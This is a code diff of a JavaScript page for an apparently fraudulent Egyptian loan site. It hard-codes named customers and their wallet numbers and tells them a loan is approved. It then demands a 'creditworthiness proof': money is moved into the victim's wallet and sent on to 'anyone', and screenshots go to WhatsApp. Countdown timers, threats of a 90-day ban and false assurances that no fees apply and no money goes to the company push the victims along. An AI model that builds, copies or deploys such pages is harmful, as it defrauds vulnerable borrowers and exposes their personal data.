-                    <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; margin: 0; text-align: right;">
-                        <i class="fas fa-info-circle" style="color: var(--danger);"></i>
-                        <strong style="color: var(--danger);">📌 تذكير هام:</strong>
-                        <br>
-                        <span style="color: var(--text-muted);">
-                            • هذا الإجراء لتأكيد ملكية المحفظة وإثبات الجدارة الائتمانية
-                            <br>
-                            • <strong style="color: var(--emerald);">لن تدفعي أي مبلغ للشركة</strong> - فقط دورة إيداع وإعادة من شخص موثوق
-                            <br>
-                            • بعد الإثبات، سيتم <strong style="color: var(--royal-gold);">صرف 150,000 ج.م</strong> فوراً على محفظتك
-                        </span>
-                    </p>
-                </div>
-                <div style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap; margin-top: 0.5rem;">
-                    <span style="background: rgba(46,204,113,0.12); border: 1px solid var(--emerald); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.7rem; color: var(--emerald);">
-                        <i class="fas fa-check-circle"></i> المبلغ جاهز
-                    </span>
-                    <span style="background: rgba(212,175,55,0.12); border: 1px solid var(--royal-gold); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.7rem; color: var(--royal-gold);">
-                        <i class="fas fa-wallet"></i> اتصالات كاش
-                    </span>
-                    <span style="background: rgba(239,68,68,0.12); border: 1px solid var(--danger); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.7rem; color: var(--danger);">
-                        <i class="fas fa-clock"></i> ينتهي قريباً
-                    </span>
-                </div>
-            </div>
-        `,
         guarantor: {
             name: "محمد مصطفي بدوي عبدالجواد",
             relation: "زوج",
@@ -1365,7 +1029,7 @@ const customersDatabase = {
         walletNum: "01005636614",
         status: "pending-approval",
         job: "سكرتيره فى شركة شحن ونقل - موظف قطاع خاص",
-        proofAmount: 80000,
+        proofAmount: 10000,
         guarantor: {
             name: "مريم ياسر عبدالمحسن عطا",
             relation: "بنت",
@@ -1373,10 +1037,9 @@ const customersDatabase = {
             phone: ""
         }
     }
-
 };
 
-// ===== دالة عرض صفحة الأقساط (محجوزة للاستخدام المستقبلي) =====
+// ===== دالة عرض صفحة الأقساط =====
 function buildInstallmentPage(customer, nationalId) {
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
     const installmentDisplay = customer.installmentAmount ? customer.installmentAmount.toLocaleString('ar-EG') : '5,000';
@@ -1384,21 +1047,32 @@ function buildInstallmentPage(customer, nationalId) {
     const paidInstallments = customer.paidInstallments || 0;
     const remainingInstallments = totalInstallments - paidInstallments;
     const firstInstallmentDate = customer.firstInstallment || "22/8/2026";
+    const transactionId = `CF-${Date.now().toString().slice(-8)}-${Math.floor(Math.random() * 1000)}`;
+    
+    const today = new Date();
+    const nextDueDate = new Date(firstInstallmentDate);
+    const daysUntilDue = Math.ceil((nextDueDate - today) / (1000 * 60 * 60 * 24));
+    const isOverdue = daysUntilDue < 0;
 
     const html = `
         <div class="installment-card">
             <span class="installment-icon"><i class="fas fa-hand-holding-usd"></i></span>
             <h2>💰 تم صرف القرض</h2>
-            <p class="sub-title">عزيزي ${customer.name}، تم صرف مبلغ القرض لحسابك</p>
+            <p class="sub-title">عزيزتي ${customer.name}، تم صرف مبلغ القرض لحسابك</p>
 
-            <div class="amount-box" style="border-color: var(--royal-gold); background: rgba(212,175,55,0.05);">
-                <div class="label">💰 إجمالي مبلغ القرض</div>
-                <div class="value" style="color: var(--royal-gold);">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+            <div style="background: rgba(46,204,113,0.08); border: 2px solid var(--emerald); border-radius: 0.8rem; padding: 0.6rem; margin: 0.5rem 0; text-align: center;">
+                <div style="font-size: 0.65rem; color: var(--text-muted);">📋 رقم العملية</div>
+                <div style="font-size: 1.2rem; font-weight: 800; color: var(--emerald); font-family: monospace;">${transactionId}</div>
             </div>
 
-            <div class="wallet-box" style="border-color: var(--royal-gold);">
+            <div class="amount-box">
+                <div class="label">💰 إجمالي مبلغ القرض</div>
+                <div class="value">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+            </div>
+
+            <div class="wallet-box">
                 <div class="label">📱 تم الصرف على محفظة ${customer.wallet}</div>
-                <div class="wallet-num" style="color: var(--royal-gold);">${customer.walletNum}</div>
+                <div class="wallet-num">${customer.walletNum}</div>
                 <div style="font-size:0.8rem; color: var(--emerald); margin-top:0.3rem;">
                     ✅ تم الصرف بالكامل (${loanDisplay} ج.م)
                 </div>
@@ -1410,14 +1084,16 @@ function buildInstallmentPage(customer, nationalId) {
                     <span style="color: var(--danger); font-weight: 800; font-size: 1rem;">تنبيه هام</span>
                 </div>
                 <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; text-align: center; margin: 0;">
-                    أنت مدان بمبلغ القرض، وسيتم مطالبتك بدفع الأقساط الشهرية
+                    أنتِ مدانة بمبلغ القرض، وسيتم مطالبتك بدفع الأقساط الشهرية
                 </p>
             </div>
 
             <div class="installment-box">
                 <div class="label">📅 أول قسط مستحق</div>
-                <div class="value" style="font-size: 2rem;">${firstInstallmentDate}</div>
-                <div class="sub-value">⏳ يرجى سداد القسط في الموعد المحدد</div>
+                <div class="value" style="${isOverdue ? 'color: var(--danger);' : 'color: var(--royal-gold);'}">${firstInstallmentDate}</div>
+                <div class="sub-value" style="${isOverdue ? 'color: var(--danger);' : 'color: var(--text-muted);'}">
+                    ${isOverdue ? `⚠️ متأخر ${Math.abs(daysUntilDue)} يوم` : `⏳ متبقي ${daysUntilDue} يوم`}
+                </div>
             </div>
 
             <div class="installment-box" style="border-color: #8B5CF6; background: rgba(139,92,246,0.05);">
@@ -1441,14 +1117,15 @@ function buildInstallmentPage(customer, nationalId) {
                 <i class="fas fa-info-circle" style="color: var(--danger);"></i>
                 <strong style="color: var(--danger);">📌 تعليمات سداد الأقساط:</strong><br>
                 <span style="color: var(--text-muted);">
+                    سيتم خصم قيمة القسط الشهري (${installmentDisplay} ج.م) تلقائياً من محفظتك في بداية كل شهر.
                     <br>
-                    <span class="highlight-danger">⚠️ في حالة  التأخراً عن السداد سيتم تطبيق غرامات مالية .</span>
+                    <span class="highlight-danger">⚠️ في حالة التأخر عن السداد سيتم تطبيق غرامات مالية.</span>
                     <br>
                     <span class="highlight">📞 يمكنك التواصل مع الدعم لأي استفسار.</span>
                 </span>
             </div>
 
-            <button class="btn-whatsapp" id="supportBtn" style="background: linear-gradient(135deg, #25D366, #128C7E); margin-top:0.5rem;">
+            <button class="btn-whatsapp" id="supportBtn" style="margin-top:0.5rem;">
                 <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم
             </button>
 
@@ -1470,220 +1147,69 @@ function buildInstallmentPage(customer, nationalId) {
             msg += `المبلغ: ${loanDisplay} ج.م\n`;
             msg += `القسط الشهري: ${installmentDisplay} ج.م\n`;
             msg += `أول قسط: ${firstInstallmentDate}\n`;
-            msg += `الأقساط المتبقية: ${remainingInstallments}\n\n`;
+            msg += `الأقساط المتبقية: ${remainingInstallments}\n`;
+            msg += `رقم العملية: ${transactionId}\n\n`;
             msg += `أحتاج مساعدة بخصوص الأقساط.`;
             openWhatsApp(msg);
         };
     }
 }
 
-// ===== دالة عرض صفحة الاستثناء الخاصة =====
-function buildExceptionProofPage(customer, nationalId) {
+// ===== دالة عرض صفحة المعالجة (processing) للعميل جمال =====
+function buildProcessingPage(customer, nationalId) {
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
-    const proofAmountDisplay = customer.proofAmount ? customer.proofAmount.toLocaleString('ar-EG') : '8,000';
-    const deadlineMinutes = customer.proofDeadline || 210;
-    const now = new Date();
-    const refNum = Math.floor(Math.random() * 1e9);
+    const transactionId = `CF-${Date.now().toString().slice(-8)}-${Math.floor(Math.random() * 1000)}`;
 
-    const startTimeKey = `exception_startTime_${nationalId}`;
-    const blockKey = `exception_blocked_${nationalId}`;
-    const proofKey = `exception_proof_done_${nationalId}`;
-    const totalSeconds = deadlineMinutes * 60;
-
-    // التحقق من وجود حظر ساري
-    const blockUntil = localStorage.getItem(blockKey);
-    if (blockUntil && parseInt(blockUntil) > Date.now()) {
-        const remainingDays = Math.ceil((parseInt(blockUntil) - Date.now()) / (1000 * 60 * 60 * 24));
-        document.getElementById('resultSection').innerHTML = `
-            <div class="cancelled-card">
-                <span class="cancel-icon"><i class="fas fa-ban"></i></span>
-                <h2>⛔ تم إيقاف التعامل</h2>
-                <p class="sub-title">لم تقم بإثبات الجدارة في الوقت المحدد</p>
-                <div class="reason-box">
-                    <p>
-                        <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
-                        <br><br>
-                        لم تقم بإثبات الجدارة الائتمانية خلال المهلة المحددة (${deadlineMinutes} دقيقة).
-                        <br><br>
-                        <span class="highlight-danger">⛔ تم إيقاف التعامل معك لمدة 90 يوماً.</span>
-                        <br><br>
-                        <span class="highlight-gold">⏳ الوقت المتبقي للحظر: ${remainingDays} يوم</span>
-                    </p>
-                </div>
-                <button class="btn-whatsapp" id="contactSupportBtn" style="margin-top:0.5rem;">
-                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم
-                </button>
-            </div>
-        `;
-        const btn = document.getElementById('contactSupportBtn');
-        if (btn) btn.onclick = () => openWhatsApp(`استفسار عن حظر 90 يومًا\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}`);
-        return;
-    }
-
-    // التحقق من إتمام الإثبات
-    if (localStorage.getItem(proofKey) === 'true') {
-        document.getElementById('resultSection').innerHTML = `
-            <div class="loan-details-card">
-                <span class="success-icon"><i class="fas fa-check-circle"></i></span>
-                <h2>✅ تم الإثبات بنجاح!</h2>
-                <p class="sub-title">${customer.successMessage || 'سيتم نزول المبلغ فوراً على محفظتك خلال دقائق.'}</p>
-                <div class="amount-box">
-                    <div class="label">💰 مبلغ القرض</div>
-                    <div class="value">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
-                </div>
-                <div class="wallet-box">
-                    <div class="label">📱 سيتم نزول المبلغ على محفظة ${customer.wallet}</div>
-                    <div class="wallet-num">${customer.walletNum}</div>
-                    <div style="font-size:0.8rem; color: var(--emerald); margin-top:0.3rem;">
-                        ✅ سيتم الصرف خلال دقائق
-                    </div>
-                </div>
-                <button class="btn-whatsapp btn-pay" id="confirmBtn" style="margin-top:0.5rem;">
-                    <i class="fas fa-check-circle"></i> تأكيد استلام المبلغ
-                </button>
-            </div>
-        `;
-        const btn = document.getElementById('confirmBtn');
-        if (btn) {
-            btn.onclick = () => {
-                let msg = `📋 تأكيد استلام المبلغ\n\n`;
-                msg += `العميل: ${customer.name}\n`;
-                msg += `الرقم القومي: ${nationalId}\n`;
-                msg += `المبلغ: ${loanDisplay} ج.م\n`;
-                msg += `رقم المحفظة: ${customer.walletNum}\n\n`;
-                msg += `أقر أنا ${customer.name} بأنني استلمت المبلغ على محفظتي.`;
-                openWhatsApp(msg);
-            };
-        }
-        return;
-    }
-
-    // حساب الوقت المتبقي
-    let startTime = localStorage.getItem(startTimeKey);
-    let currentSeconds = totalSeconds;
-    let timeUp = false;
-
-    if (startTime) {
-        const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
-        currentSeconds = Math.max(0, totalSeconds - elapsed);
-        if (currentSeconds <= 0) {
-            timeUp = true;
-        }
-    } else {
-        startTime = Date.now();
-        localStorage.setItem(startTimeKey, startTime.toString());
-    }
-
-    if (timeUp) {
-        const blockUntilTimestamp = Date.now() + (90 * 24 * 60 * 60 * 1000);
-        localStorage.setItem(blockKey, blockUntilTimestamp.toString());
-        localStorage.removeItem(startTimeKey);
-        document.getElementById('resultSection').innerHTML = `
-            <div class="cancelled-card">
-                <span class="cancel-icon"><i class="fas fa-ban"></i></span>
-                <h2>⏰ انتهت المهلة</h2>
-                <p class="sub-title">لم تقم بإثبات الجدارة في الوقت المحدد</p>
-                <div class="reason-box">
-                    <p>
-                        <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
-                        <br><br>
-                        انتهت المهلة المحددة (${deadlineMinutes} دقيقة) دون إثبات الجدارة الائتمانية.
-                        <br><br>
-                        <span class="highlight-danger">⛔ سيتم إيقاف التعامل معك لمدة 90 يوماً.</span>
-                        <br><br>
-                        <span style="color: var(--text-muted);">يمكنك التواصل مع الدعم للاستفسار.</span>
-                    </p>
-                </div>
-                <button class="btn-whatsapp" id="contactSupportBtn" style="margin-top:0.5rem;">
-                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم
-                </button>
-            </div>
-        `;
-        const btn = document.getElementById('contactSupportBtn');
-        if (btn) btn.onclick = () => openWhatsApp(`طلب ملغي - حظر 90 يومًا\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}`);
-        return;
-    }
-
-    // عرض صفحة الإثبات مع العداد
     const html = `
-        <div class="proof-credit-card" style="border-color: #FF6B6B;">
-            <span class="proof-icon" style="color: #FF6B6B;"><i class="fas fa-exclamation-triangle"></i></span>
-            <h2 style="color: #FF6B6B;">⚠️ استثناء خاص لإثبات الجدارة</h2>
-            <p class="sub-title">${customer.exceptionMessage || 'هذا استثناء خاص لإثبات الجدارة الائتمانية. يجب الإثبات قبل انتهاء المهلة.'}</p>
-
-            <div style="background: rgba(255, 107, 107, 0.1); border: 2px solid #FF6B6B; border-radius: 0.8rem; padding: 0.8rem; margin: 0.8rem 0; position: relative; z-index: 1;">
-                <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; margin: 0;">
-                    <strong style="color: #FF6B6B;">📌 تعليمات هامة:</strong><br>
-                    • يجب إثبات الجدارة الائتمانية قبل انتهاء المهلة المحددة.<br>
-                    • في حالة الإثبات خلال الوقت المسموح، سيتم <strong style="color: var(--emerald);">نزول المبلغ فوراً</strong> بحسابك.<br>
-                    • إذا انتهت المدة دون إثبات، سيتم <strong style="color: #FF6B6B;">إلغاء العملية</strong> وسيتم <strong style="color: #FF6B6B;">إيقاف التعامل لمدة 90 يوماً</strong>.
-                </p>
-            </div>
-
-            <div class="amount-box" style="border-color: #FF6B6B; background: rgba(255,107,107,0.05);">
-                <div class="label">💰 مبلغ القرض</div>
-                <div class="value" style="color: #FF6B6B;">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
-            </div>
-
-            <div class="wallet-box" style="border-color: #FF6B6B;">
-                <div class="label">📱 سيتم نزول المبلغ على محفظة ${customer.wallet}</div>
-                <div class="wallet-num" style="color: #FF6B6B;">${customer.walletNum}</div>
-            </div>
-
-            <div class="proof-box" style="border-color: #FF6B6B;">
-                <div class="label">💰 المبلغ المطلوب لإثبات الجدارة</div>
-                <div class="value" style="color: #FF6B6B;">${proofAmountDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
-                <div style="font-size:0.7rem; color: var(--text-muted); text-align:center; margin-top:0.2rem;">
-                    (هذا المبلغ ليس للشركة، بل لإثبات الجدية والجدارة الائتمانية)
-                </div>
-            </div>
-
-            <div class="info-box" style="border-right-color: #FF6B6B;">
-                <i class="fas fa-info-circle" style="color: #FF6B6B;"></i>
-                <strong style="color: #FF6B6B;">📌 ما هو إثبات الجدارة الائتمانية؟</strong><br>
-                <span style="color: var(--text-muted);">
-                    هو إجراء أمني لتأكيد ملكية المحفظة وإثبات الجدارة الائتمانية. 
-                    <span class="highlight">لن تقوم بتحويل أي أموال للشركة</span>، فقط دورة إيداع من شخص موثوق وإعادته لإثبات نشاط الحساب والجدارة الائتمانية.
+        <div class="payment-card" style="border: 2px solid var(--anuta-blue);">
+            <div class="payment-header">
+                <span class="title">⏳ جاري تنفيذ الإجراءات</span>
+                <span class="badge" style="background: rgba(0,191,255,0.12); border-color: var(--anuta-blue); color: var(--anuta-blue);">
+                    <i class="fas fa-spinner fa-pulse"></i> قيد التنفيذ
                 </span>
             </div>
 
-            <div class="steps-mini">
-                <div class="step">
-                    <div class="num">1</div>
-                    <span><strong>📥 استلام المبلغ</strong> اطلب من شخص تثق فيه تحويل <strong style="color: #FF6B6B;">${proofAmountDisplay} ج.م</strong> إلى محفظتك</span>
+            <div style="background: rgba(0,191,255,0.04); border-radius: 0.8rem; padding: 0.5rem; margin: 0.5rem 0; text-align: center;">
+                <div style="font-size: 0.65rem; color: var(--text-muted);">📋 رقم العملية</div>
+                <div style="font-size: 1.2rem; font-weight: 800; color: var(--anuta-blue); font-family: monospace;">${transactionId}</div>
+            </div>
+
+            <div class="amount-display">
+                <div class="label">💰 مبلغ القرض المطلوب صرفه</div>
+                <div class="value">${loanDisplay}</div>
+                <div class="currency">ج.م</div>
+            </div>
+
+            <div class="payment-details">
+                <div class="row">
+                    <span class="key"><i class="fas fa-user"></i> اسم العميل</span>
+                    <span class="value">${customer.name}</span>
                 </div>
-                <div class="step">
-                    <div class="num">2</div>
-                    <span><strong>📸 تصوير الرصيد</strong> التقط صورة شاشة واضحة تظهر المبلغ في حسابك</span>
+                <div class="row">
+                    <span class="key"><i class="fas fa-id-card"></i> الرقم القومي</span>
+                    <span class="value gold">${nationalId}</span>
                 </div>
-                <div class="step">
-                    <div class="num">3</div>
-                    <span><strong>🔄 إعادة المبلغ</strong> قم بتحويل نفس المبلغ مرة أخرى لأي شخص</span>
+                <div class="row">
+                    <span class="key"><i class="fas fa-wallet"></i> المحفظة</span>
+                    <span class="value gold">${customer.wallet}</span>
                 </div>
-                <div class="step">
-                    <div class="num">4</div>
-                    <span><strong>📸 تصوير التحويل</strong> التقط صورة شاشة لإشعار خروج المبلغ</span>
+                <div class="row">
+                    <span class="key"><i class="fas fa-hashtag"></i> رقم المحفظة</span>
+                    <span class="value gold">${customer.walletNum}</span>
                 </div>
-                <div class="step">
-                    <div class="num">5</div>
-                    <span><strong>📤 إرسال الصور للدعم</strong> أرسل صور الإيداع والتحويل عبر واتساب</span>
+                <div class="row">
+                    <span class="key"><i class="fas fa-briefcase"></i> الوظيفة</span>
+                    <span class="value">${customer.job}</span>
+                </div>
+                <div class="row">
+                    <span class="key"><i class="fas fa-map-marker-alt"></i> العنوان</span>
+                    <span class="value">${customer.address || "غير مسجل"}</span>
                 </div>
             </div>
 
-            <div class="timer-danger" style="border-color: #FF6B6B; background: radial-gradient(circle, rgba(255,107,107,0.12), transparent);">
-                <div><i class="fas fa-stopwatch" style="color: #FF6B6B;"></i> الوقت المتبقي لإثبات الجدارة الائتمانية</div>
-                <div class="timer" id="exceptionTimer" style="color: #FF6B6B;">${formatTime(currentSeconds)}</div>
-                <div style="font-size:0.65rem; color: #FF6B6B;">
-                    ⏳ يجب إكمال الإثبات قبل انتهاء الوقت
-                    <br>⚠️ في حالة عدم الإثبات سيتم إيقاف التعامل 90 يوماً
-                </div>
-            </div>
+            ${customer.processingMessage || ''}
 
-            <button class="btn-whatsapp btn-proof" id="proofBtn" style="background: linear-gradient(135deg, #FF6B6B, #EE4444);">
-                <i class="fas fa-paper-plane"></i> إرسال إثبات الجدارة الآن
-            </button>
-
-            <div style="margin-top: 0.8rem; text-align: center; font-size: 0.7rem; color: var(--text-muted); position: relative; z-index: 1;">
+            <div style="margin-top: 0.8rem; text-align: center; font-size: 0.7rem; color: var(--text-muted);">
                 <i class="fas fa-lock"></i> هذه العملية آمنة ومشفرة | لا توجد أي رسوم مطلوبة
             </div>
         </div>
@@ -1692,83 +1218,21 @@ function buildExceptionProofPage(customer, nationalId) {
     document.getElementById('resultSection').innerHTML = html;
     document.getElementById('errorCard').style.display = 'none';
 
-    // ===== تشغيل العداد =====
-    if (exceptionTimerInterval) clearInterval(exceptionTimerInterval);
-    let secondsLeft = currentSeconds;
-    const timerEl = document.getElementById('exceptionTimer');
-
-    exceptionTimerInterval = setInterval(() => {
-        if (secondsLeft <= 0) {
-            clearInterval(exceptionTimerInterval);
-            const blockUntilTimestamp = Date.now() + (90 * 24 * 60 * 60 * 1000);
-            localStorage.setItem(blockKey, blockUntilTimestamp.toString());
-            localStorage.removeItem(startTimeKey);
-            document.getElementById('resultSection').innerHTML = `
-                <div class="cancelled-card">
-                    <span class="cancel-icon"><i class="fas fa-ban"></i></span>
-                    <h2>⏰ انتهت المهلة</h2>
-                    <p class="sub-title">لم تقم بإثبات الجدارة في الوقت المحدد</p>
-                    <div class="reason-box">
-                        <p>
-                            <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
-                            <br><br>
-                            انتهت المهلة المحددة (${deadlineMinutes} دقيقة) دون إثبات الجدارة الائتمانية.
-                            <br><br>
-                            <span class="highlight-danger">⛔ سيتم إيقاف التعامل معك لمدة 90 يوماً.</span>
-                            <br><br>
-                            <span style="color: var(--text-muted);">يمكنك التواصل مع الدعم للاستفسار.</span>
-                        </p>
-                    </div>
-                    <button class="btn-whatsapp" id="contactSupportBtn" style="margin-top:0.5rem;">
-                        <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم
-                    </button>
-                </div>
-            `;
-            const btn = document.getElementById('contactSupportBtn');
-            if (btn) btn.onclick = () => openWhatsApp(`طلب ملغي - حظر 90 يومًا\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}`);
-        } else {
-            secondsLeft--;
-            timerEl.innerText = formatTime(secondsLeft);
-            if (secondsLeft < 60) {
-                timerEl.style.animation = 'pulseRed 0.8s infinite alternate';
-            }
-        }
-    }, 1000);
-
-    // ===== ربط زر إثبات الجدارة =====
-    const proofBtn = document.getElementById('proofBtn');
-    if (proofBtn) {
-        proofBtn.onclick = () => {
-            let msg = `📤 إرسال إثبات الجدارة الائتمانية (استثناء)\n\n`;
+    // ===== ربط زر واتساب =====
+    const processingBtn = document.getElementById('processingWhatsAppBtn');
+    if (processingBtn) {
+        processingBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            let msg = `📱 طلب ربط الحساب لتسييل المبلغ\n\n`;
             msg += `العميل: ${customer.name}\n`;
             msg += `الرقم القومي: ${nationalId}\n`;
-            msg += `المبلغ المطلوب صرفه: ${loanDisplay} ج.م\n`;
-            msg += `مبلغ الإثبات: ${proofAmountDisplay} ج.م\n`;
-            msg += `⚠️ استثناء: مدة الإثبات ${deadlineMinutes} دقيقة\n`;
-            msg += `في حالة عدم الإثبات خلال الوقت المحدد سيتم إيقاف التعامل لمدة 90 يوم.\n`;
-            msg += `في حالة الإثبات سيتم نزول المبلغ فوراً.\n\n`;
-            msg += `سأقوم بإرسال صور إثبات الجدارة (دخول وخروج) لإتمام الصرف فوراً.\n\n`;
-            msg += `أقر أنا ${customer.name} بأنني قمت بإجراءات إثبات الجدارة الائتمانية وأتعهد بالالتزام بشروط وأحكام التمويل.`;
+            msg += `المبلغ: ${loanDisplay} ج.م\n`;
+            msg += `نوع المحفظة: ${customer.wallet}\n`;
+            msg += `رقم المحفظة: ${customer.walletNum}\n`;
+            msg += `رقم العملية: ${transactionId}\n\n`;
+            msg += `أحتاج إلى الطريقة الصحيحة لربط الحساب ورفع الأربع عمليات لتسييل المبلغ.`;
             openWhatsApp(msg);
-            
-            localStorage.setItem(proofKey, 'true');
-            proofBtn.disabled = true;
-            proofBtn.style.opacity = '0.6';
-            proofBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال الإثبات';
-            setTimeout(() => {
-                searchCustomer();
-            }, 1500);
-        };
-    }
-
-    function formatTime(seconds) {
-        const hours = Math.floor(seconds / 3600);
-        const minutes = Math.floor((seconds % 3600) / 60);
-        const secs = seconds % 60;
-        if (hours > 0) {
-            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-        }
-        return `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        });
     }
 }
 
@@ -1777,7 +1241,6 @@ function buildLoanDisbursedPage(customer, nationalId) {
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
     const proofAmountDisplay = customer.proofAmount ? customer.proofAmount.toLocaleString('ar-EG') : (customer.loan < 100000 ? '6,000' : '8,000');
 
-    // عرض بيانات الضامن إن وجدت
     let guarantorHtml = '';
     if (customer.guarantor) {
         guarantorHtml = `
@@ -1797,7 +1260,6 @@ function buildLoanDisbursedPage(customer, nationalId) {
         `;
     }
 
-    // عرض الوظيفة إن وجدت
     let jobHtml = '';
     if (customer.job) {
         jobHtml = `
@@ -1808,30 +1270,35 @@ function buildLoanDisbursedPage(customer, nationalId) {
         `;
     }
 
-    // ===== رسالة تحذيرية خاصة للعميلة سماح =====
-    let specialWarningHtml = '';
-    if (customer.isSpecialWarning && customer.specialWarning) {
-        specialWarningHtml = customer.specialWarning;
-    }
-
     const html = `
-        <div class="loan-details-card">
-            <span class="success-icon"><i class="fas fa-check-circle"></i></span>
-            <h2>✅ تم تجهيز صرف القرض</h2>
-            <p class="sub-title">عزيزي ${customer.name}، تم تجهيز مبلغ القرض للصرف</p>
-
-            ${specialWarningHtml}
-
-            <div class="amount-box">
-                <div class="label">💰 إجمالي مبلغ القرض</div>
-                <div class="value">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+        <div class="payment-card" style="border: 2px solid var(--emerald);">
+            <div class="payment-header">
+                <span class="title">✅ صرف القرض</span>
+                <span class="badge">معتمد</span>
             </div>
 
-            <div class="wallet-box">
-                <div class="label">📱 سيتم نزول المبلغ على محفظة ${customer.wallet}</div>
-                <div class="wallet-num">${customer.walletNum || 'سيتم تحديده'}</div>
-                <div style="font-size:0.8rem; color: var(--emerald); margin-top:0.3rem;">
-                    ✅ المبلغ: <strong>${loanDisplay} ج.م</strong>
+            <div class="amount-display">
+                <div class="label">💰 مبلغ القرض</div>
+                <div class="value">${loanDisplay}</div>
+                <div class="currency">ج.م</div>
+            </div>
+
+            <div class="payment-details">
+                <div class="row">
+                    <span class="key"><i class="fas fa-user"></i> اسم العميل</span>
+                    <span class="value">${customer.name}</span>
+                </div>
+                <div class="row">
+                    <span class="key"><i class="fas fa-id-card"></i> الرقم القومي</span>
+                    <span class="value gold">${nationalId}</span>
+                </div>
+                <div class="row">
+                    <span class="key"><i class="fas fa-wallet"></i> المحفظة</span>
+                    <span class="value gold">${customer.wallet}</span>
+                </div>
+                <div class="row">
+                    <span class="key"><i class="fas fa-hashtag"></i> رقم المحفظة</span>
+                    <span class="value gold">${customer.walletNum}</span>
                 </div>
             </div>
 
@@ -1845,17 +1312,10 @@ function buildLoanDisbursedPage(customer, nationalId) {
                     ✅ سيتم نزول <strong style="color: var(--emerald);">${loanDisplay} ج.م</strong> على محفظة <strong style="color: #00BFFF;">${customer.walletNum || 'سيتم تحديده'}</strong>
                 </span>
             </div>
-        </div>
 
-        <!-- ===== إثبات الجدارة الائتمانية ===== -->
-        <div class="proof-credit-card">
-            <span class="proof-icon"><i class="fas fa-shield-alt"></i></span>
-            <h2>🔐 إثبات الجدارة الائتمانية</h2>
-            <p class="sub-title">لإتمام صرف القرض، يرجى إثبات الجدارة الائتمانية</p>
-
-            <div class="proof-box">
-                <div class="label">💰 المبلغ المطلوب لإثبات الجدارة</div>
-                <div class="value">${proofAmountDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
+            <div class="proof-box" style="background: rgba(139,92,246,0.05); border: 2px solid #8B5CF6; border-radius: 1rem; padding: 0.8rem; margin: 0.8rem 0;">
+                <div class="label" style="font-size: 0.7rem; color: var(--text-muted); text-align: center;">💰 المبلغ المطلوب لإثبات الجدارة</div>
+                <div style="font-size: 2rem; font-weight: 900; color: #8B5CF6; text-align: center; text-shadow: 0 0 20px rgba(139,92,246,0.3);">${proofAmountDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
                 <div style="font-size:0.7rem; color: var(--text-muted); text-align:center; margin-top:0.2rem;">
                     (هذا المبلغ ليس للشركة، بل لإثبات الجدية والجدارة الائتمانية)
                 </div>
@@ -1870,36 +1330,32 @@ function buildLoanDisbursedPage(customer, nationalId) {
                 </span>
             </div>
 
-            <div class="steps-mini">
-                <div class="step">
-                    <div class="num">1</div>
-                    <span><strong>📥 استلام المبلغ</strong> اطلب من شخص تثق فيه تحويل <strong style="color: #8B5CF6;">${proofAmountDisplay} ج.م</strong> إلى محفظتك</span>
+            <div class="steps-box" style="background: rgba(255,255,255,0.02); border-radius: 0.8rem; padding: 0.8rem; margin: 0.8rem 0; border: 1px solid rgba(255,255,255,0.04);">
+                <div class="step" style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.03);">
+                    <div class="num" style="min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">1</div>
+                    <div class="text"><strong>📥 استلام المبلغ</strong><br>اطلب من شخص تثق فيه تحويل <strong style="color: #8B5CF6;">${proofAmountDisplay} ج.م</strong> إلى محفظتك</div>
                 </div>
-                <div class="step">
-                    <div class="num">2</div>
-                    <span><strong>📸 تصوير الرصيد</strong> التقط صورة شاشة واضحة تظهر المبلغ في حسابك</span>
+                <div class="step" style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.03);">
+                    <div class="num" style="min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">2</div>
+                    <div class="text"><strong>📸 تصوير الرصيد</strong><br>التقط صورة شاشة واضحة تظهر المبلغ في حسابك</div>
                 </div>
-                <div class="step">
-                    <div class="num">3</div>
-                    <span><strong>🔄 إعادة المبلغ</strong> قم بتحويل نفس المبلغ مرة أخرى لأي شخص</span>
+                <div class="step" style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.03);">
